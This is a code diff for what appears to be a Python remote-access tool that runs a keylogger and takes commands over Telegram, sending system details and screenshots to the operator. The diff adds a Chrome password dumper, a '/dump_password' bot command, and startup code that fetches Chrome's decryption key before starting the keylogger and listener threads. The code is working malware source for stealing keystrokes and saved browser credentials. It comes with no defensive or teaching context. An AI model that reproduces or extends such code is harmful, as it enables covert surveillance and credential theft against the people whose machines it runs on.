@@ -4,6 +4,7 @@ import threading
 from pynput.keyboard import Listener
 from telegram import check_telegram, send_telegram
 from get_info import SystemInfo, IPAddress, get_mac
+from dump import ChromePasswordDumper
 from screenshot import send_screenshot
 
 def telegram_listener():
@@ -41,6 +42,10 @@ def telegram_listener():
                 config_info = system_info.display_info()
                 send_telegram(f'System Configuration: \n{config_info}')
 
+            elif command_lower == '/dump_password':
+                dumper = ChromePasswordDumper()
+                dumper.dump_passwords()
+
             elif command_lower == '/screenshot':
                 send_screenshot()
                 send_telegram('Screenshot taken and sent!')
@@ -61,9 +66,18 @@ def keylogger_listener():
         listener.join()
 
 if __name__ =='__main__':
+    dumper = ChromePasswordDumper()
+    secret_key = dumper.get_secret_key()   
+    if secret_key: 
+        print("Secret key retrieved successfully. Starting password dump.")
+    else: 
+        print('"[ERR] Unable to retrieve secret key. Exiting."')
+    
     telegram_thread = threading.Thread(target=telegram_listener)
     keylogger_thread = threading.Thread(target=keylogger_listener)
+    
     telegram_thread.start()
     keylogger_thread.start()
+    
     telegram_thread.join()
     keylogger_thread.join()
